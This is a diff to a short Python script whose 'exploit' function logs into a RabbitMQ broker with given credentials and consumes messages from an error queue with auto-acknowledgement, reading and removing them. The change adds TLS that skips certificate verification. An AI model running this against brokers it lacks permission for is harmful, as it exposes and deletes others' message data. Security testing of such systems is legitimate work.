@@ -5,6 +5,7 @@ import sys
 import pika
 import json
 import base64
+import ssl
 
 def callback(ch, method, properties, body):
     msg = json.loads(body)
@@ -12,7 +13,9 @@ def callback(ch, method, properties, body):
 
 def exploit(host, user, password, queue):
     credentials = pika.PlainCredentials(user, password)
-    connection = pika.BlockingConnection(pika.ConnectionParameters(host, credentials=credentials))
+    cxt = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+    ssl_options = pika.SSLOptions(context=cxt)
+    connection = pika.BlockingConnection(pika.ConnectionParameters(host=host, port=5672, credentials=credentials, ssl_options=ssl_options))
     channel = connection.channel()
 
     channel.basic_consume(queue=queue, auto_ack=True, on_message_callback=callback)
@@ -27,7 +30,7 @@ def exploit(host, user, password, queue):
 
 if __name__ == "__main__":
     if len(sys.argv) != 5:
-        print("USAGE: %s <host> <user> <password> <queue>" % sys.argv[0], file=sys.stderr)
+        print("USAGE: %s <host> <user> <password> <error queue>" % sys.argv[0], file=sys.stderr)
         sys.exit(-1);
     else:
         exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
